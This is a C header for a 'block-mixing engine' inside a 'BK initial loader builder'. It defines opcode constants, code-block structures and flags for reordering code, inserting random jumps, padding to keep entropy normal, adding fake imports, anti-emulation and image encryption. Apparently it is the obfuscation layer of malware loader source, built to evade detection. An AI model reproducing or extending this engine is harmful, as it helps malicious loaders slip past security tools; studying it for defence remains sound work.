//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BK initial loader builder. Version 2.9.2
//	
// module: bme.h
// $Revision: 39 $
// $Date: 2012-05-02 15:38:09 +0400 (Ср, 02 май 2012) $
// description:
//	Block-mixing engine structures and definitions.

#if _DEBUG
	#define	_DUMP_BLOCKS		TRUE
#endif

#define MAX_BLOCKS			0x7f
#define DEFAULT_IMAGE_SIZE	0x1000
#define MAX_BLOCK_SIZE		0x400
#define RESERVED_BLOCKS		1

#define INTEGER				INT	// used in variables.h

#define OP_CALL_FAR			(USHORT)0x15ff
#define OP_CALL_EBP			(USHORT)0xd5ff
#define	OP_CALL_ECX			(USHORT)0xd1ff
#define OP_JMP_COND			(UCHAR)0x70
#define OP_JMP_SHORT		(UCHAR)0xe0
#define	OP_NOP				(UCHAR)0x90
#define OP_ICEBP			(UCHAR)0xf1
#define OP_RET_NEAR			(UCHAR)0xc3
#define OP_INT3				(UCHAR)0xcc
#define OP_POP_EBP			(UCHAR)0x5d
#define	OP_SALC				(UCHAR)0xd6
#define	OP_MOV_CL_BYTE		(UCHAR)0xb1
#define	OP_SHR_SHL			(UCHAR)0xc1
#define	OP_MOV_REG_PTR		(UCHAR)0x8b
#define	OP_MOV_PTR_REG		(UCHAR)0x89

#define	OP_MOV_BYTE_PTR_16	(USHORT)0x06c6
#define	OP_MOV_WORD_PTR_16	(USHORT)0x06c7
#define	OP_PUSH_WORD_PTR	(USHORT)0x70ff
#define	OP_MOV_REG_WORD_PTR	(USHORT)0x408b
#define	OP_MOV_AX_WORD_PTR  (USHORT)0x058b

#define	ADDRESS_SIZE_PREFIX	(USHORT)0x67



#define OPCODE_JMP_SHORT	(UCHAR)0xeb
#define OPCODE_JMP_NEAR		(UCHAR)0xe9
#define OPCODE_CALL_NEAR	(UCHAR)0xe8

#define BRANCH_TYPE_NEAR		1
#define BRANCH_TYPE_VA			2


#define	COMMON_CHECK_MASK	0x0000ff00

#define IMPORT_INDEX_MASK	0x000000ff
#define IMPORT_INDEX_CHECK	0x0000f200

#define MAX_IMPORT_VALUE	IMPORT_INDEX_MASK

#define CONST_INDEX_MASK		0x000000ff
#define CONST_INDEX_CHECK		0x0000f100
#define	OUTCALL_INDEX_MASK		0x000000ff

#define INSTANCE_TYPE_IMPORT	1
#define INSTANCE_TYPE_CONSTANT	2
#define INSTANCE_TYPE_BRANCH	3
#define INSTANCE_TYPE_OUTCALL	4


#pragma pack (push)
#pragma pack(1)
typedef struct _CODE_BLOCK
{
	ULONG_PTR	Offset;
	ULONG		Size;
	ULONG		Flags;
} CODE_BLOCK, *PCODE_BLOCK;

typedef struct _CODE_TABLE_ENTRY
{
	SHORT	Offset;
//	USHORT	Size;
}CODE_TABLE_ENTRY, *PCODE_TABLE_ENTRY;

#pragma pack (pop)

typedef struct _GROW_BUFFER
{
	PCHAR	Buffer;
	PCHAR	Pos;
	PCHAR	End;
	ULONG	Increment;
	ULONG	Size;
} GROW_BUFFER, *PGROW_BUFFER;


typedef struct _BLOCK_DESCRIPTOR
{
	LIST_ENTRY	ConstListHead;
	LIST_ENTRY	InstrListHead;
	LIST_ENTRY	JmpBlockListHead;
	LIST_ENTRY	CRefListHead;
	PCODE_BLOCK	BlockTable;				// source block table
	PCHAR		Binary;					// pointer to block binary data
	PUCHAR		RndIndexMap;			// random index map
	ULONG		Offset;					// block offset relaitive to the code image
	ULONG		Entry;					// image entry point offset relaitive to Binary data
	ULONG		Size;					// block size in bytes
	ULONG		sSize;					// source block size in bytes
	ULONG		ImportCount;			// number of import calls	
	ULONG		ConstCount;				// number of constants accessed within block
	ULONG		BranchCount;			
	ULONG		CRefCount;				// number of cross-references (call ebp)
	ULONG		InstructionCount;		// number of instructions in block
	ULONG		Flags;	
	ULONG		Index;					// current block index
	ULONG		NewIndex;				// new block index, if random indexes are specified
	ULONG		FirstBranch;			// first branch instruction index within a block
	CHAR		Data[MAX_BLOCK_SIZE];	// storage for block binary data
} BLOCK_DESCRIPTOR, *PBLOCK_DESCRIPTOR;

#define MAX_INSTRUCTION_LEN	8	// bytes

// Describes single assembler instruction
typedef struct _INSTRUCTION
{
	ULONG		Magic;		// should be a value of INSTRUCTION_MAGIC
	LIST_ENTRY	Entry;		// instruction list entry
	ULONG		Offset;		// offset relative to a start of the block
	ULONG		vOffset;	// virtual offset relative to a start of the block
	UCHAR		TotalLen;	// length of the whole instruction in bytes
	UCHAR		BranchLen;	// length of the instruction used to recalculate brunches (for instruction adding or swapping)
	UCHAR		OpcodeLen;	// length of the opcode in bytes
	UCHAR		Type;		// instruction type
	ULONG		Flags;		// variouse flags
	ULONG		Reference;	// if this instruction references other one, this value is the Offset of that instruction
	CHAR		Data[MAX_INSTRUCTION_LEN];	// instruction code
} INSTRUCTION, *PINSTRUCTION;

#define		INSTRUCTION_MAGIC	'TSNI'

#define		ASSERT_INSTRUCTION(x)	if (x->Magic != INSTRUCTION_MAGIC) __debugbreak();// ASSERT(x->Magic == INSTRUCTION_MAGIC)

// Instruction flags
#define		IF_NOCOPY	1	// instruction shouldn't be copied

// Instruction types
typedef enum InstructionTypes
{
	INSTR_UNKNOWN, 
	INSTR_CONST_ACCESS,
	INSTR_IMPORT_ACCESS,
	INSTR_IMPORT_CALL,
	INSTR_CALL_EBP,
	INSTR_JMP_SHORT,
	INSTR_BRANCH_NEAR,
	INSTR_DB,
	INSTR_CALL_BLOCK,
	INSTR_MOV_AL_INDEX
};

typedef struct _CONST_DESCRIPTOR
{
	ULONG_PTR	Value;
	ULONG		Type;
} CONST_DESCRIPTOR, *PCONST_DESCRIPTOR;

// Constant types
#define CONST_VA	1	// Constant is virtual address and it needs to be relocated


#define	INDEX_CORE			0
#define INDEX_TABLE			1
#define	INDEX_ENTRY			2


extern PCHAR g_core_start;
extern PCHAR g_core_end;
extern PCHAR g_entry_start;
extern PCHAR g_entry_end;
extern CODE_BLOCK	g_fakeimport;

#define MIXED_CODE_MAGIC	'CXIM'


typedef struct _IMAGE_BLOCK
{
	LIST_ENTRY	Entry;		// Block list entry 
	PCHAR		Binary;
	ULONG		Size;
	ULONG		Flags;
	ULONG		Index;
} IMAGE_BLOCK, *PIMAGE_BLOCK;


typedef struct _MIXED_CODE
{
#if _DEBUG
	ULONG	Magic;				// should be a value of the MIXED_CODE_MAGIC
#endif
	LIST_ENTRY	BlockListHead;		// list of separate code blocks
	LIST_ENTRY	ConstListHead;		// list of used constants
	LIST_ENTRY	CRefListHead;		// list of block cross-references within the code
	PCHAR		Image;				// Pointer to mixed image 
	ULONG		IndexBase;			// Base of random indexes
	ULONG		ImageRva;			// address of the mixed code image relative to PE image base
	ULONG		ImportCount;		// number of imported functions
	ULONG		ConstCount;			// number of used constants
	ULONG		RelocCount;			// number of relocation entries
	ULONG		CRefCount;			// number of block cross-references
	ULONG		Size;				// size of the buffer
	ULONG		EntryPoint;			// offset of the image entry point
	ULONG		EntryOffset;		// offset of the entry block within the binary buffer
	ULONG		EntrySize;			// size of the Entry block, used to copy whole entry block to an other place
	ULONG		CoreOffset;			// offset of the core module within the binary buffer
	ULONG		CoreVaOffset;		// offset to place core VA
	ULONG		Block0Offset;		// offset of the block #0 relative to the core
	ULONG		TableOffset;		// offset of the function table relative to the core
	ULONG		Flags;				// variouse flags
	ULONG		XorValue;			// xor value
} MIXED_CODE, *PMIXED_CODE;



#define BF_TYPE_MASK	0xff


// Block types
#define BF_TYPE_ENTRY		1		// entry block
#define BF_TYPE_CORE		2		// core block
#define	BF_TYPE_DATA		4		// block contains data



#define BF_CODE16			0x100	// block contains 16-bit code
#define	BF_INIT				0x200	// block used for initialization, so it shouldn't be encrypted
#define BF_NO_EBP			0x400	// replace "call ebp" with near jumps within a block


// Block flags
#define BF_ALIASES			0x4000

#define BF_ENTROPY			0x4000	// add number of null bytes to a block to support normal code entropy
#define	BF_JUMPS			0x8000	// mix code block with random jump instructions
#define BF_VIRTUAL			0x10000	// block is virtual: processed but not copyed to the code
#define BF_ENTRY_AT_BEGIN	0x20000	// block entry at the offset 0 

// Access flags
#define	AF_VIRTUAL			BF_VIRTUAL


#define MCF_IGNORE_MASK			BF_TYPE_MASK

#define MCF_IGNORE_PACK			BF_TYPE_PACK
#define MCF_IGNORE_CRYPT		BF_TYPE_CRYPT
#define MCF_IGNORE_ENTROPY		BF_TYPE_ENTROPY
#define MCF_IGNORE_RELOC		BF_TYPE_RELOC	
#define MCF_IGNORE_WIN32		BF_TYPE_WIN32
#define MCF_IGNORE_ANTIEM		BF_TYPE_ANTIEM

#define MCF_ALIGN_BLOCKS		BF_ALIGN_PTR
#define MCF_NO_EBP				BF_NO_EBP
#define MCF_KEEPEBP				BF_KEEPEBP
#define MCF_NO_CHANGE			BF_NO_CHANGE

#define MCF_ENTROPY				BF_ENTROPY

#define MCF_RANDOM_SPACES		0x10000			// create random-sized spaces between blocks
#define MCF_RANDOM_INDEXES		0x20000			// create random block indexes
#define MCF_ENTRY_AT_BEGIN		0x40000			// image starts with the entry point
#define MCF_JUMPS				BF_JUMPS			// mix block with jump instructions

#define MCF_FAKE_IMPORT			0x100000
#define MCF_RND_INDEX			0x200000


// Jump-blocks.
// Used to split a single code block into multiple parts connected with jump instructions.
// Each such part described by a JMP_BLOCK.
typedef struct _JMP_BLOCK
{
	LIST_ENTRY	InstrListHead;	// List of instructions in jump-block
	LIST_ENTRY	Entry;			// Jump-block list entry
	ULONG		iOffset;		// Jump-block offset relative to a code block start. Equal to the offset of the first instruction.
	ULONG		vOffset;
	ULONG		rOffset;		// Real jump block offset, used to mix blocks
	ULONG		Size;			// Size of the jump block in bytes
	ULONG		Count;			// Number of instructions in jump block
	ULONG		Next;			// Next instruction number
} JMP_BLOCK, *PJMP_BLOCK;

#define INVALID_OFFSET	(ULONG)-1


BOOL BmeCreateMixedCode(PMIXED_CODE	MixedCode, PCODE_BLOCK CodeBlock, ULONG Seed, ULONG Flags);
BOOL BmeReleaseMixedCode(PMIXED_CODE MixedCode);
BOOL BmeConstants(PMIXED_CODE MixedCode, PCONST_DESCRIPTOR Constants);
BOOL BmeEncryptImage(PMIXED_CODE MixedCode);


// BME options
#define JMP_BLOCK_MIN	3		// Minimum number instructions in jump-block
#define JMP_BLOCK_MAX	6		// Maximum number instructions in jump block
